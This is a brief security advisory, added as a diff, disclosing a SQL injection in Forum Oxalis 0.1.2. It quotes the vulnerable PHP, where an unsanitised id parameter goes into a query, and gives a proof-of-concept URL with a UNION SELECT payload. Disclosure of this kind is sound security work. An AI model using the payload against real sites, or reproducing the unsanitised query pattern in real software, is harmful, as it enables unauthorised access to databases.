@@ -1,0 +1,60 @@
+#################################################
+Forum Oxalis 0.1.2 <= SQL Injection Vulnerability
+#################################################
+
+Discovered by: Jean Pascal Pereira <pereira@secbiz.de>
+
+Vendor information:
+
+"Forum Oxalis is a minimalis GPL PHP forum using CSS."
+
+Vendor URI: http://developer.berlios.de/projects/forumoxalis/
+
+#################################################
+
+Risk-level: High
+
+The application is prone to a remote SQL injection vulnerability.
+
+-------------------------------------
+
+func.php, line 72:
+
+function lister_messages($id, $page, $parpage)
+
+{
+    global $mysql_table;
+
+    $resu = mysql_query("select * from `$mysql_table` where id=$id");
+
+    $nombre_messages = mysql_num_rows($resu);
+
+forum.php, line 7:
+
+$id = $_GET['id'];
+
+forum.php, line 74:
+
+case "message":
+
+    lister_messages($id, $page, $reponses_par_page);
+
+    $reponse_a_id = $id;
+
+    break;
+
+-------------------------------------
+
+Exploit / Proof Of Concept:
+
+http://localhost/ForumOxalis/index.php?id=99999/**/UNION/**/SELECT/**/0x00,version(),0x00,0x00,0x00,0x00,0x00,0x00,0x00&action=message
+
+-------------------------------------
+
+Solution:
+
+Do some input validation. 
+
+-------------------------------------
+
+################################################# 
